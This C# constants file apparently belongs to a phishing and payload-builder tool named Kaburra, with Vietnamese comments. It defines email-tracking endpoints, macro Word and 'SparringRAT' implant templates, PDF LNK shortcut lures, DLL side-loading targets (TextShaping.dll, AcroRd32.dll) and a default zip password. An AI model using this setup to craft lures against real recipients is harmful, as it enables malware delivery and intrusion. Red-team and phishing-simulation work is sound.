using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Kaburra
{
    internal class Marker
    {
        public static string getLogURI = @"/kaburra/getlog";
        public static string clearLogURI = @"/kaburra/clearlog";
        public static string trackingPrefix = @"/kaburra/track";
        public static string uploadURI = @"kaburra/upload/files"; //upload parameter: file
        public static string downloadURI = @"/kaburra/download/"; //all uploaded file stay here

        public static string eHASH = @"EEEEEEEEEEEEEEEE"; //hash của địa chỉ email người nhận LowerCase
        public static string mHASH = @"MMMMMMMMMMMMMMMM"; //hash subject email được gửi đi 
        public static string xHASH = @"XXXXXXXXXXXXXXXX"; //hash filename của attachment

        //Mark trong MS WORD file
        public static string docxRqURL = @"KABURRA_REQUESTURL";
        //tên file word template
        public static string docxVBATemplate = @"VBAWORD.BIN";
        public static string docxXmlFilePath = @"word/document.xml";
        public static string docxInputFolder7Z = @"./word";
        public static string docxXmlFor7Zip = @"word\document.xml";

        //Mark URL trong SparringRAT PE
        public static string sparrURLMark = @"AAAAAAAA";
        //tên file SparringRAT template
        public static string ratPETemplate = @"SPARRING.BIN";
        //Word Side-Loading DLL
        public static string wordPE = @"WORDPE.BIN"; //nằm trong folder Template
        public static string wordSideLoadDLL = @"TextShaping.dll";
        //Adobe PDF Side-Loading DLL
        public static string pdfPE = @"PDFPE.BIN"; // nằm trong folder Template
        public static string pdfSideLoad = @"AcroRd32.dll";

        public static string defaultZipPasswd = @"123456";

        //Attachment Description
        public static string docMacros = @"MS Doc File";
        public static string lnkPdf = @"PDF LNK Shortcut";
        public static string wordEXE = @"MSWord Exe Side-Loading";
        public static string AdobeEXE = @"Adobe Exe Side-Loading";

        public static string ConfigFile = "cfg.json";

    }
}
